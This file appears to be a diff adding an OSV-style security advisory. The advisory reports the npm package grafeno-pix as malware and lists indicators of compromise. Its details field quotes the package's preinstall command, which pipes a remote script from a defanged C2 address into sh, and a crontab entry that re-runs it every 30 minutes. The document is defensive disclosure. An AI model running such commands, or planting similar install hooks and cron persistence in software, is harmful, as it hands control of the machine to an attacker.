@@ -1,0 +1,64 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-11695",
+  "modified": "2026-08-28T22:49:17Z",
+  "published": "2026-08-28T22:49:01Z",
+  "summary": "Malicious code in grafeno-pix (npm)",
+  "details": "The preinstall hook executes a remote shell script at install time and installs a persistent cron job. On install it runs `curl -s 216[.]126[.]236[.]46/x.sh|sh` via bash, then adds a crontab entry that re-downloads and re-executes the same script every 30 minutes (`*/30 * * * * curl -s 216[.]126[.]236[.]46/x.sh|sh`). The package body is a stub with no real functionality, so the \"PIX integration\" description is a lure. C2: 216[.]126[.]236[.]46, path /x.sh.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "grafeno-pix",
+        "purl": "pkg:npm/grafeno-pix"
+      },
+      "versions": [
+        "1.0.0"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ]
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/grafeno-pix/v/1.0.0"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-11695"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-08-28T22:49:01Z",
+      "indicators_observed": {
+        "ip_observed": [
+          "216[.]126[.]236[.]46"
+        ],
+        "sha256": [
+          "88c0fdf6288424fbeceb062905517b32a5f9106861acf9b1d6ef22c9166748a8"
+        ],
+        "url_observed": [
+          "hxxp://216[.]126[.]236[.]46/x[.]sh"
+        ]
+      }
+    }
+  }
+}
